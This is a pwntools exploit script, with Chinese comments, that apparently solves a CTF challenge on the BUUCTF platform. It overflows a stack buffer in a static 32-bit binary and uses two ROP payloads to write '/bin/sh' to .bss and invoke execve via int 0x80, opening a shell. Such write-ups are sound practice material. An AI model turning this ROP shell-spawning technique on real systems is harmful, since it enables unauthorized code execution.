from pwn import *

# ELF静态编译，存在栈溢出，nx保护开启，pie没开，system函数没有。
# 考虑写入'/bin/sh'然后int 0x80系统调用执行execve('/bin/sh', 0, 0)
# 32位execve对应系统调用号为11

p = remote('node4.buuoj.cn', 29586)

bss = 0x80eaf80
int_0x80 = 0x806c943
pop_eax = 0x80b8016
pop_edcbx_ret = 0x806ed00
read_addr = 0x806d290
gets_addr = 0x804f0d0
main_addr = 0x8048894

payload1 = b'a'*(0xc+4) + p32(gets_addr) + p32(main_addr) + p32(bss)
p.sendline(payload1)
p.sendline(b'/bin/sh\x00') # sendline换行符对应gets终止条件。注意：如果前面写的是read的话，这里就要用send而不是sendline
payload2 = b'a'*(0xc+4) + p32(pop_eax) + p32(11) + p32(pop_edcbx_ret) + p32(0) + p32(0) + p32(bss) + p32(int_0x80)
p.sendline(payload2)

p.interactive()